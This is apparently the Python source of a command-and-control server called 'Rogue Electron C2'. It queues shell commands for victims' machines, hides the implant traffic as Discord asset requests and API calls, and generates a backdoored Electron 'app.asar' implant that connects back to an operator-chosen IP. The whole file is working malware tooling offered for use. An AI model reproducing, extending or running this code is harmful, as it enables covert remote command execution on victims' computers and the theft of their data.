from typing import *
from fastapi import FastAPI, Request
from fastapi.responses import PlainTextResponse
import base64
import json
import os
import sys
import threading
import uvicorn
from asargen import createAsarFile

ADDRESS: str = "127.0.0.1"
PORT: int = 1337
CMD_HISTORY: List[str] = []
CMD_QUEUE: List[str] = []
PAUSE_CMDS: bool = False

app = FastAPI()

cmdRequests = [
"bootstrap.js",
"index.html",
"styles.css",
"app.css",
"discord.js",
"app.js",
"channels.json",
"messages.json",
"user_settings.json",
"profile_picture.png",
"emoji.gif",
"fontawesome.woff",
"roboto.woff2",
"voice_message.mp3",
"video_attachment.mp4",
"icon.svg",
"manifest.json"
]

outputRequests = [
"api/v9/channels/{channel_id}/messages",
"api/v9/channels/{channel_id}/messages/attachments",
"api/v9/users/@me/settings",
"api/v9/guilds/{guild_id}/channels",
"api/v9/invite/{invite_code}",
"api/v9/oauth2/token",
"api/v9/users/@me/avatar",
"api/v9/channels/{channel_id}/messages/bulk-delete",
"api/v9/applications/{application_id}/commands",
"api/v9/users/@me/guilds"
]

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def fancyprint(text: str):
    print("\r" + text + "\n$ ", end="")

@app.get("/{path:path}", response_class=PlainTextResponse)
async def get_command(path: str, request: Request):
    if path in cmdRequests: 
        if len(CMD_QUEUE) == 0:
            return "204 - No Content"
        cmd: str = CMD_QUEUE.pop(0)
        fancyprint(f"Running '{cmd}'...")
        CMD_HISTORY.append(cmd)
        return cmd

@app.post("/{path:path}")
async def send_output(path: str, request: Request):
    if path in outputRequests:
        data: dict = await request.json()
        fancyprint("Output:")
        fancyprint(data["result"])

def printHeader():
    print(f"""{bcolors.FAIL} 
                                            
                           #############                           
                        ###################                        
                      ########## # ##########                      
                    ############# #  ##########                    
                    #####      ####       #####                    
                   ####  #####    #### ###  ####                   
                  #####  ###  ######## #### #####                  
                  ###### #  ########## ### ######                  
                  ######  ######   ###    #######                  
                  #####  #  ########## ##########                  
                   ####   ##   ####### ##   ####                   
                    ###   ######    ## ##   ###                    
                    #########  #####    #######                    
                      ########  ##   ########                      
                        ###################                        
                           #############                           
                                                                      
    {bcolors.ENDC}""")
    print("                         Rogue Electron C2")
    print("\n")

def generateAsar():
    ADDRESS = input("Enter server IP address: ")

    asarFile = ""

    while asarFile == "":
        asarFile = input("Please provide an ASAR archive: ")
        if os.path.exists(asarFile):
            break
        else:
            print(f"{asarFile} is not a valid ASAR archive, please provide a valid ASAR archive.")
            asarFile = ""

    createAsarFile(asarFile, ADDRESS, PORT)
    print("Successfully created implant \"app.asar!\"")

def input_thread():
    printHeader()
    portSet = False
    customPort = ""
    

    while portSet == False:
        customPort = input("Enter a port number to listen on or leave blank to use default (1337): ")
        if customPort.strip() == "":
            PORT = 1337
            portSet = True
        elif not customPort.isdigit():
            print("Port must be an integer!!")
        else:
            PORT = customPort
            portSet = True
        
    print(f"Starting listener on port: {PORT}!")

    asarchoice = ""

    while asarchoice != "y" or asarchoice != "n":
        asarchoice = input("Would you like to generate asar implant file? (y or n): ")
        if asarchoice == "y":
            generateAsar()
            break
        elif asarchoice == "n":
            break
        else:
            print("Please enter y or n")
    
    while True:

        new_cmd: str = input("$ ")
        #help
        if new_cmd == "help":
            print("""Run a command on the victim or
    - use \"history\" to view command history.
    - use \"help\" to view this help message.
    - use \"exit\" to exit.
            """)
        #history
        elif new_cmd == "history":
            print("History:")
            for cmd in CMD_HISTORY:
                print("  " + cmd)
        #queue
        elif new_cmd == "queue":
            if len(CMD_QUEUE) == 0:
                print("Queue Empty.")
            else:
                print("Queue:")
                for cmd in CMD_QUEUE:
                    print("  " + cmd)
        #exit
        elif new_cmd == "exit":
            print("Exitting...")
            # You're welcome :)
            os.system(f"kill {os.getpid()}")
            while True: pass
        #banner
        elif new_cmd == "banner":
            printHeader()
        #execute command on victim
        else:
            CMD_QUEUE.append(new_cmd)
        #commands queued up
        if len(CMD_QUEUE) > 1:
            print(f"Added '{new_cmd}' to queue...")


threading.Thread(target = input_thread).start()
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="critical", ssl_keyfile="TLS/key.pem", ssl_certfile="TLS/cert.pem") #start web server on current host (0.0.0.0) using the PORT variable
